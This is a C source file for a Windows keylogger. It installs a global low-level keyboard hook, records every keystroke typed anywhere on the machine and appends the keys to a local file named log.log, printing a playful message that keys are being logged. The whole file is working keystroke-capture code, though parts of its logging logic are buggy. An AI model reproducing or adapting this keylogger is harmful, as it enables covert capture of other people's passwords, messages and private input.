#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <string.h>

struct Tree
{
    char key[20];
    struct Tree *pointerLeft;
    struct Tree *pointerRight;
    struct Tree *parent;
};

struct Tree* root = NULL;

struct Tree *newTreeNode(const char *key)
{
    struct Tree* node = (struct Tree*)malloc(sizeof(struct Tree));
    strcpy(node-> key, key);
    node -> pointerLeft = NULL;
    node -> pointerRight = NULL;
    node -> parent = NULL;
    return node;
}
struct Tree *insert (struct Tree *root, const char *key)
{
    if (root == NULL)
    {
        return newTreeNode(key);
    }
        root -> pointerRight = insert(root -> pointerRight, key);
    
    return root;
} 
void postOrder(struct Tree* root, FILE *fl)
{ 
    fl = fopen("log.log", "a");
    if (root == NULL) {
        return;
    }
    
    postOrder(root -> pointerLeft, fl);
    postOrder(root -> pointerRight, fl);
    fputs(root -> key, fl);
    printf("%s", root -> key);
    fclose(fl);
     
}
LRESULT hook_proc(int code, WPARAM wParam, LPARAM lParam)
{
    FILE *fl;
    //Logging
    KBDLLHOOKSTRUCT *vkey = (KBDLLHOOKSTRUCT *) lParam;
    if(wParam == WM_KEYDOWN)
    {
        switch (vkey -> vkCode)
        {
        case VK_SPACE:
            {
            root = insert(root," ");
            }
            break;   

        case VK_RETURN:
            {
            postOrder(root,fl);
            printf("/-ENTER-/");}
            break;
        case VK_TAB:
            {
            root = insert(root, "TAB");
            }
            break;
        case VK_SHIFT:
            printf("/-SHIFT-/");
            break;
        case VK_LSHIFT:
            {
            root = insert(root,"SHIFT");
            }
            break;
        case VK_CONTROL:
            printf("/-CTRL-/");
            break;
        case VK_LCONTROL:                                                           
            {
            root = insert(root,"CTRL");
            }
            break;
        case VK_MENU:
            printf("/-ALT-/");
            break;
        case VK_LMENU:
            printf("/-ALT-/");
            break;
        case VK_RMENU:
            printf("/-ALT-/");
            break;
        case VK_BACK:
            {
            root = insert(root,"BACK_SPACE");
            }
            break;
        case VK_LBUTTON:
            printf("/-L_MOUSE_BUTTON-/");
            break;
        case VK_RBUTTON:
            printf("/-R_MOUSE_BUTTON-/");
            break;
        default:
            {
            char key[20];
            sprintf(key, "%c", vkey->vkCode);
            root = insert(root,key);
            printf("%c", vkey->vkCode);
            }
            break;
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

int main ()
{   
    
    printf("Keys are being logged tehe\n");
    HHOOK hhook = SetWindowsHookExA(
        WH_KEYBOARD_LL,
        hook_proc,
        NULL,
        0
    );
    if (hhook == NULL)
        printf("Hook was not installed \n");
    printf("Hook is active \n");

    //loop
    MSG msg;
    while((GetMessage(&msg ,NULL ,0 ,0 )) != 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
}